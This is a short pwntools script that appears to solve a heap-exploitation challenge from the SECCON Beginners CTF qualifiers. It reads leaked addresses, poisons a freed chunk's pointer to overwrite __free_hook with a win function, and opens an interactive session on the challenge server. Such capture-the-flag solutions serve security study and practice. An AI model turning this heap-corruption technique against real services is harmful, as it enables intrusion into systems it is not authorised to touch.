from pwn import *
import time

def one(d):
    c.sendline("1")
    c.sendline(d)
    c.recvuntil(">")

def two(d):
    c.sendline("2")
    c.sendline(d)
    c.recvuntil(">")

def three():
    c.sendline("3")
    c.recvuntil(">")

c = remote('bh.quals.beginners.seccon.jp', 9002)
c.recvuntil("<__free_hook>: ")
free_hook=int(c.recv(14),16)
c.recvuntil("<win>: ")
win=int(c.recv(14),16)
c.recvuntil(">")

two("A"*8)
three()
one("B"*24+p64(0x41)+p64(free_hook))
two("A"*8)
three()
two(p64(win))
three()

c.interactive()
